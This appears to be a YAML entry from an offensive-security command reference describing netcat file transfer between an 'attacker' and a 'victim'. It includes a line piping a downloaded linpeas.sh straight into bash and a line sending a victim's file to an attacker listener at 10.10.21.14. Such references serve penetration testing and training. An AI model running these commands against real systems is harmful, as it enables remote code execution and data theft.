---
description: |
  The Netcat (nc) command is a command-line utility for reading and writing data between two computer networks. Which can be used to transfer files between victim and attacker.

  Command Reference:

  	File to copy: linpeas.sh

    nc -lvnp 9001 < linpeas.sh (attacker) & nc 10.10.21.14 9001 | bash (victim)

    nc 10.10.21.14 9001 < file.txt (victim) & nc -lvnp 9001 > file.txt (attacker)


command: |
  nc -lvnp 9001 < linpeas.sh
items:
  - Shell
services:

OS:
  - Windows
  - Linux
attack_types:
  - General
references:
  - https://medium.com/iostrap/how-to-transfer-files-between-servers-using-netcat-d8bc13eebea
  - https://linux.die.net/man/1/nc
---